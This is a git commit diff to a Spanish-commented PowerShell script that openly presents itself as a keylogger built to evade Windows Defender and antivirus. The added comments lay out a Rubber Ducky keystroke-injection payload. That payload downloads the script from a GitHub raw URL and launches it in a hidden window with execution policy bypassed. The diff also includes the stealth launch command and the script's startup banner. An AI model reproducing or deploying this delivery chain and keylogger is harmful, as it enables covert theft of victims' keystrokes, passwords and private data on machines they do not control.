1e5f73b2e0eefe5c2bae63f93df642e50fafaccb
C4sp3r <55068123+C4sp3r2222@users.noreply.github.com>
2025-08-12 18:58:31 +0200

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,24 +1,55 @@
-# Presentación colorida y visual al iniciar el keylogger
+# ---------------------------------------------------------
+# By Ruben Guerrero Muñoz - 2025
+# ---------------------------------------------------------
 
-# Ejecucion en Powershell en modo sigiloso y persistente:
+
+# Keylogger capaz de evadir Windows Defender 11 y Antivirus.
+
+# Creado con la idea de ejecutarlo remotamente desde un rubberducky.
+
+# ---------------------------------------------------------
+# PAYLOAD para RUBBER DUCKY;
+# ---------------------------------------------------------
+
+# DELAY 20
+# GUI r
+# DELAY 20
+# STRING cmd
+# ENTER	
+# ENTER
+# DELAY 20
+# STRING powershell
+# ENTER
+# DELAY 20
+# STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/C4sp3r2222/duckylog/main/script.ps1" -OutFile "$env:USERPROFILE\Desktop\script.ps1"
+# ENTER
+# DELAY 300
+# STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Users\$env:USERNAME\Desktop\script.ps1' -WindowStyle Hidden -ErrorAction SilentlyContinue"
+# ENTER
+
+
+# ---------------------------------------------------------
+# EJECUCION en Powershell en modo sigiloso y persistente:
+# ---------------------------------------------------------
 
 # powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Users\$env:USERNAME\Desktop\script.ps1' -WindowStyle Hidden -ErrorAction SilentlyContinue"
 
-
+# ---------------------------------------------------------
 # DETENCION DE SCRIPT:
-# Ejecutar en Powershell:
+# ---------------------------------------------------------
 
+# Ejecutar en Powershell:
 # Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*script.ps1*' } | Select-Object ProcessId, CommandLine
 
-# (Veremos un numero ed proceso asociado Ej 1234 )
+# (Veremos un numero de proceso asociado Ej: 1234 )
 
-# Para detenerlo:
+# Para detenerlo, ejecutar en powershell:
 # Stop-Process -Id 1234 -Force
 
 # (Detenemos el proceso)
 
 
-# Función para escribir texto con colores y efectos
+
 function Write-Color {
     param (
         [string]$Text,
@@ -40,7 +71,7 @@ $shell.MinimizeAll()
 Write-Color "[+] Iniciando Keylogger..." Cyan
 Start-Sleep -Seconds 1
 
-Write-Color "[+] El documento resultante será almacenado en: keylogger.txt" Yellow
+Write-Color "[+] El documento resultante sera almacenado en: keylogger.txt" Yellow
 Write-Color "[+] Para detener el proceso ejecute en una nueva CMD o PowerShell los siguientes comandos:" Green
 Write-Color "    1º - Detectar el nº de proceso asociado:" Green
 Write-Color "        Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*script.ps1*' } | Select-Object ProcessId, CommandLine" DarkGray
